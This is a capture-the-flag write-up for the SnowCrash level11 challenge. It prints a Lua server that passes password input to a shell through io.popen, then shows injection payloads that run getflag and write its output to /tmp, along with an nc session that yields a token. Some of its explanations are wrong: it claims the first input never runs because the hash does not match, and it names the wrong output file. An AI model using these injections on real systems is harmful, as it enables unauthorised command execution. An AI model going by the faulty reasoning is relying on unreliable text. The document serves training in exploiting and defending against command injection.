How to find:
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile

Content of the .lua File
The main file running on the server is level11.lua. Below is the content of this file:

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end

The server is designed to accept password inputs, but it actually evaluates these inputs as shell commands. This is done using the io.popen() function in Lua, which allows executing commands and capturing their output.

prog = io.popen("echo "..pass.." | sha1sum", "r")

Example Commands
1. Using getflag > /tmp/password:

    When trying to send this string as a password, the server validates it as a single input. Since it does not match the expected password hash, the server rejects the input and does not execute the command.

2. Using (; getflag > /tmp/flag11) (&& getflag > /tmp/flag11):

    By including a semicolon before the command, the server is allowed to execute multiple commands. The shell interprets that it should execute an empty command before the ; and then executes getflag, which allows redirecting the command's output to /tmp/password, effectively creating the flag.

3. Using `getflag` > /tmp/flag11:

    Similar to the previous examples, entering this command allows the server to execute getflag, which redirects the output to /tmp/flag11. This also allows access to the flag.

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: && getflag > /tmp/flag11
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Conclusion
    This discovery highlights the importance of input validation in systems that allow command execution. The lack of proper validation can lead to command injection vulnerabilities, enabling attackers to execute unauthorized commands on the system.